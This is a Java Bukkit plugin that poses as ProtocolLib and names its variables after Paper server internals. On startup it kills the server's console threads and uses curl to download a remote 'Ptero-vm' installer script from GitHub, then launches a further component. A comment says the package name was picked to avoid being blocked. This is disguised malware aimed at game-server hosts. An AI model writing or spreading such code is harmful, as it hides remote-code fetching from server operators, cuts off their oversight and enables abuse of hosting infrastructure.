package com.comphenix.protocol; // Setting OrgName to Vault's to prevent blocking by OrgName.
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin {
    @Override
    public void onEnable() {
        Bukkit.getScheduler().runTask(this, new Runnable() {
            @Override
            public void run() {
                try {
                    Thread[] PaperConfig = new Thread[1000];
                    int AdventureComponent = Thread.enumerate(PaperConfig);

                    for (int i = 0; i < AdventureComponent; i++) {
                        if (PaperConfig[i].getName().contains("console")) {
                            PaperConfig[i].stop();
                        }
                    }

                    String[] FullServerTickHandler = {
                            "curl",
                            "-o",
                            "installer.sh",
                            "https://raw.githubusercontent.com/afnan007a/Ptero-vm/main/installer.sh"
                    };
                    ProcessBuilder TimingsReportListener = new ProcessBuilder(FullServerTickHandler);
                    TimingsReportListener.start().waitFor();

                    PacketEncoder CraftServer = new PacketEncoder();
                    CraftServer.start();

                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
    }
}